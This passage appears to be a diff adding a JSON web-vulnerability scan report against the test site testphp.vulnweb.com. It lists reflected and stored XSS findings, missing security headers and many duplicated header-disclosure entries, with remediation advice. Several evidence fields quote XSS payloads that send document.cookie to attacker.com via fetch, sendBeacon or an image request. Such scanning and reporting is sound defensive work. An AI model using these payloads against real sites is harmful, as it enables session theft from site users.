+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "6e15bbc8-2081-46a5-ad90-e6bad576de51",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<script>alert(String.fromCharCode(88,83,83))</script>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "db75011c-22f3-4e96-bb4f-54fde55f1684",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";\nalert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--\n></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "b7b680e2-88ca-47cd-9213-48d9f55b9f99",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<script>new Image().src=\"http://attacker.com/?\"+document.cookie;</script>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "d463b86f-8dad-4177-841f-187509493b39",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<script>fetch('http://attacker.com/?'+document.cookie);</script>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "244b2ac5-afe7-4bd9-a8b1-b82e012bb9a6",
+        "name": "Reflected Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability detected in form parameter: searchFor",
+        "severity": "high",
+        "location": "http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Parameter 'searchFor' with payload '<script>navigator.sendBeacon('http://attacker.com', document.cookie);</script>' was reflected in the response",
+        "protection": "No XSS protection headers detected",
+        "remediation": "Sanitize and validate all user inputs. Use proper output encoding. Consider implementing a Content Security Policy (CSP).",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      },
+      {
+        "id": "0e24692a-e594-4289-af72-045391aeeb0d",
+        "name": "Stored Cross-Site Scripting (XSS)",
+        "description": "Stored XSS vulnerability detected where user input is stored and displayed without proper sanitization",
+        "severity": "critical",
+        "location": "http://testphp.vulnweb.com/search.php?test=query -> http://testphp.vulnweb.com/search.php?test=query",
+        "evidence": "Payload 'Test<img src=x onerror=\"console.log('8e6Mj3Ay')\">' was stored and reflected in the response",
+        "remediation": "Implement proper input sanitization and output encoding. Use a Content Security Policy (CSP) and consider using a library like DOMPurify for sanitization.",
+        "scanner": "EnhancedXSSScanner",
+        "timestamp": "2025-04-01T17:12:27.595062",
+        "references": [
+          "https://owasp.org/www-community/attacks/xss/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+        ]
+      }
+    ],
+    "SQL_Injection": [],
+    "HTTP_Methods": [
+      {
+        "id": "25dbf067-db75-47ef-bae7-e56b31addc5b",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "7b5c0490-192b-426c-9b12-7991c9453e27",
+        "name": "Information Disclosure: X-Powered-By",
+        "description": "The server discloses potentially sensitive information in the X-Powered-By header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+        "remediation": "Remove or obfuscate the X-Powered-By header"
+      },
+      {
+        "id": "27ea5dfb-effd-4511-b2e8-6c4b60b13d6e",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "3f5d4f4f-66b4-4f2f-b2e6-68b0caf5c0d0",
+        "name": "Information Disclosure: X-Powered-By",
+        "description": "The server discloses potentially sensitive information in the X-Powered-By header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+        "remediation": "Remove or obfuscate the X-Powered-By header"
+      },
+      {
+        "id": "856e055d-6250-49b7-a2ff-480e7be85ddf",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "97fd4c0c-924c-4f5c-bbcc-864919cf9145",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "ab2115a4-9d4f-4460-90d7-bca7b3a2e097",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "1cbaa2ed-4743-4c31-b97a-03c6963c1a92",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "4e1fb7d9-f64d-44fe-9c03-9cff7fbcda4f",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "31d94bfc-a1a1-4638-b6ee-32b50692c0dd",
+        "name": "Information Disclosure: X-Powered-By",
+        "description": "The server discloses potentially sensitive information in the X-Powered-By header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+        "remediation": "Remove or obfuscate the X-Powered-By header"
+      },
+      {
+        "id": "82d584d4-03a1-469f-b70c-cd036498189d",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "0f65835a-411c-43a7-879b-85ca49121fd9",
+        "name": "Dangerous HTTP Method Allowed: CONNECT",
+        "description": "The server allows the potentially dangerous HTTP method: CONNECT without proper authorization",
+        "severity": "medium",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "HTTP 400 response for CONNECT request",
+        "remediation": "Disable the CONNECT HTTP method or implement proper authorization for it"
+      },
+      {
+        "id": "35a045a7-11b0-41e4-9216-c6e3248bc186",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "ef815e0f-6561-40ab-b387-52d99250f329",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "6e51951c-2d5e-4180-b40e-0472afe94ab4",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "32169c33-4bfa-4582-954a-1f2c9d058896",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "c1e53228-0935-4097-a478-5458ab4a71e0",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "b6f60be7-5bf3-4a8c-b8cb-92973e282ee1",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "d9c7018c-11af-420e-9e6c-226b71780f12",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "d66ad046-1e26-46b3-8398-3d5a9ac0dc80",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "878d4e1a-37b4-4567-9573-9a9bc7b71368",
+        "name": "Information Disclosure: Server",
+        "description": "The server discloses potentially sensitive information in the Server header",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Server: nginx/1.19.0",
+        "remediation": "Remove or obfuscate the Server header"
+      },
+      {
+        "id": "c21ea731-b373-4978-9a5a-317fdd263eb6",
+        "name": "Missing Security Header: Strict-Transport-Security",
+        "description": "The HTTP response is missing the security header: Strict-Transport-Security",
+        "severity": "medium",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header Strict-Transport-Security not found in response",
+        "remediation": "Implement the Strict-Transport-Security security header"
+      },
+      {
+        "id": "4395dd53-4173-4731-ba60-fa5a24974c78",
+        "name": "Missing Security Header: Content-Security-Policy",
+        "description": "The HTTP response is missing the security header: Content-Security-Policy",
+        "severity": "medium",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header Content-Security-Policy not found in response",
+        "remediation": "Implement the Content-Security-Policy security header"
+      },
+      {
+        "id": "7f2bf00e-6fdf-4094-8cb5-2ce1769194cd",
+        "name": "Missing Security Header: X-Content-Type-Options",
+        "description": "The HTTP response is missing the security header: X-Content-Type-Options",
+        "severity": "medium",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header X-Content-Type-Options not found in response",
+        "remediation": "Implement the X-Content-Type-Options security header"
+      },
+      {
+        "id": "eb45e866-7004-4ab0-9c6c-0dcb92a9b7a4",
+        "name": "Missing Security Header: X-Frame-Options",
+        "description": "The HTTP response is missing the security header: X-Frame-Options",
+        "severity": "medium",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header X-Frame-Options not found in response",
+        "remediation": "Implement the X-Frame-Options security header"
+      },
+      {
+        "id": "167cc429-cbd9-4190-86ab-3aa1d414acd4",
+        "name": "Missing Security Header: X-XSS-Protection",
+        "description": "The HTTP response is missing the security header: X-XSS-Protection",
+        "severity": "medium",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header X-XSS-Protection not found in response",
+        "remediation": "Implement the X-XSS-Protection security header"
+      },
+      {
+        "id": "2ed915a7-2909-4ac6-8f35-6dd3696093bb",
+        "name": "Missing Security Header: Referrer-Policy",
+        "description": "The HTTP response is missing the security header: Referrer-Policy",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header Referrer-Policy not found in response",
+        "remediation": "Implement the Referrer-Policy security header"
+      },
+      {
+        "id": "5cf56ecb-6015-431f-8d8c-d29dd864199f",
+        "name": "Missing Security Header: Feature-Policy",
+        "description": "The HTTP response is missing the security header: Feature-Policy",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header Feature-Policy not found in response",
+        "remediation": "Implement the Feature-Policy security header"
+      },
+      {
+        "id": "5fe3bd60-5e19-40e1-8d7a-13f90b59912e",
+        "name": "Missing Security Header: Permissions-Policy",
+        "description": "The HTTP response is missing the security header: Permissions-Policy",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header Permissions-Policy not found in response",
+        "remediation": "Implement the Permissions-Policy security header"
+      },
+      {
+        "id": "c184b87a-fe94-4dd5-9868-ed6b5a365ec0",
+        "name": "Missing Security Header: Public-Key-Pins",
+        "description": "The HTTP response is missing the security header: Public-Key-Pins",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header Public-Key-Pins not found in response",
+        "remediation": "Implement the Public-Key-Pins security header"
+      },
+      {
+        "id": "db78d7f7-3e87-47ea-907a-500cd45cf4b7",
+        "name": "Missing Security Header: Cache-Control",
+        "description": "The HTTP response is missing the security header: Cache-Control",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header Cache-Control not found in response",
+        "remediation": "Implement the Cache-Control security header"
+      },
+      {
+        "id": "e838a9f6-46a5-466c-b7c4-66a1117bd8d0",
+        "name": "Missing Security Header: Pragma",
+        "description": "The HTTP response is missing the security header: Pragma",
+        "severity": "low",
+        "location": "http://testphp.vulnweb.com/",
+        "evidence": "Header Pragma not found in response",
+        "remediation": "Implement the Pragma security header"
+      }
+    ],
+    "File_Upload": []
+  },
+  "summary": {
+    "Basic": 12,
+    "XSS": 37,
+    "SQL_Injection": 0,
+    "HTTP_Methods": 32,
+    "File_Upload": 0,
+    "total": 81
+  }
+}
